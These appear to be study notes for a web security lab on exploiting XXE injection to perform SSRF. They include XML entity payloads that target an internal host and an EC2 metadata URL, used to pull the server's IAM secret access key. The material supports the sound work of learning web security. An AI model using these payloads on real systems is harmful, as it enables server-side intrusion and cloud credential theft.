## Introduction
- Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF).
- This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.
- To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value.
- If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).

**Example** - the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:
```js
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

## Steps to solve lab
### Desc - Exploiting XXE to perform SSRF attacks
**Our end goal** - The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive. To solve the lab, exploit the [XXE](https://portswigger.net/web-security/xxe) vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint.

1. Send the `POST /product/stock` to burp **Repeater**.
![[XXE4.png]]

2. Now, put `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>` below the XML element and you get the server's IAM secret access key from the EC2 metadata endpoint.
![[XXE5.png]]

